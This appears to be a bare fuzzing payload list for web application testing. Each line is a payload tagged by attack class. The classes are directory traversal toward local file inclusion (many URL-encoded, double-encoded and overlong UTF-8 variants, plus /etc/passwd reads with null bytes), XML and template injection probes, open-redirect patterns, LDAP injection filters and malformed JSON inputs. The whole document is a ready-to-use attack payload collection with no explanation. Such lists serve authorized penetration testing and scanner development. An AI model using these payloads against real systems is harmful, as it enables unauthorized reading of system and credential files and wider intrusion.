/..../..../..../..../..../..../..../@LFI dot sot slash Directory
/...\...\...\...\...\...\...\...\@LFI dot sot slash Directory
/.../.../.../.../.../.../.../.../@LFI dot sot slash Directory
//..\/..\/..\/..\/..\/..\/..\/..\@LFI dot sot slash Directory
/\../\../\../\../\../\../\../@LFI dot sot slash Directory
/%252e%252e%255c%252e%252e%255c%252e%252e%255c@LFI dot sot slash Directory
/%252e%252e\%252e%252e\%252e%252e\%252e%252e\@LFI dot sot slash Directory
/..%255c..%255c..%255c..%255c..%255c..%255c..%255c@LFI dot sot slash Directory
/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c@LFI dot sot slash Directory
/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\@LFI dot sot slash Directory
/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c@LFI dot sot slash Directory
/..\..\..\..\..\..\..\..\@LFI dot sot slash Directory
/%252e%252e%252f%252e%252e%252f%252e%252e%252f@LFI dot sot slash Directory
/%252e%252e/%252e%252e/%252e%252e/%252e%252e/@LFI dot sot slash Directory
/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f@LFI dot sot slash Directory
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f@LFI dot sot slash Directory
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/@LFI dot sot slash Directory
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f@LFI dot sot slash Directory
/../../../../../../../@LFI dot sot slash Directory
/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\@LFI dot sot slash Directory
../../../../../../../../../../@LFI dot sot slash Directory
/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/@LFI dot sot slash Directory
/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af@LFI dot sot slash Directory
/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/@LFI dot sot slash Directory
/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af@LFI dot sot slash Directory
/..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af@LFI dot sot slash Directory
/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/@LFI dot sot slash Directory
/%25c0%25ae%25c0%25ae%25c0%25af@LFI dot sot slash Directory
/..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c@LFI dot sot slash Directory
/%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\@LFI dot sot slash Directory
/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c@LFI dot sot slash Directory
/..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c@LFI dot sot slash Directory
/%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\@LFI dot sot slash Directory
/..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66@LFI dot sot slash Directory
/%%32%65%%32%65/%%32%65%32%65/%32%65%%32%65/@LFI dot sot slash Directory
/etc/passwd%00@LFI Interested Directory
/etc%2fpasswd@LFI Interested Directory
/etc%2fpasswd%00@LFI Interested Directory
/etc%5cpasswd@LFI Interested Directory
/etc%5cpasswd%00@LFI Interested Directory
/etc%c0%afpasswd%00@LFI Interested Directory
&apos;XoiZR@xml attacks
&lt;%= Tnn96 %&gt;@xml attacks
&lt;? Tnn96 ?&gt;@xml attacks
///{target}@redirect injection
////{target}@redirect injection
/\{target}@redirect injection
%2f{target}@redirect injection
%2f$2f{target}@redirect injection
%2f{target}%2f%2f@redirect injection
$2f%2f{target}%2f%2f@redirect injection
%2A%28%7C%28mail%3D%2A%29%29@LDAPi
%2A%28%7C%28objectclass%3D%2A%29%29@LDAPi
%2A%7C@LDAPi
["1","2"]@JSON_Fuzzing
["\x00"]@JSON_Fuzzing
["\x00", "\x00"]@JSON_Fuzzing
[{"1":"0"}]@JSON_Fuzzing
["1",{"1":"0"}]@JSON_Fuzzing
[1,{"1":"0"}]@JSON_Fuzzing
[{"1":"0"},1]@JSON_Fuzzing
[":test", "1"]@JSON_Fuzzing
[":\x00", "1"]@JSON_Fuzzing
":test"@JSON_Fuzzing
"\"\\/Date(1335205592410)\\/\""@JSON_Fuzzing
"\"\\/Date(-1)\\/\""@JSON_Fuzzing
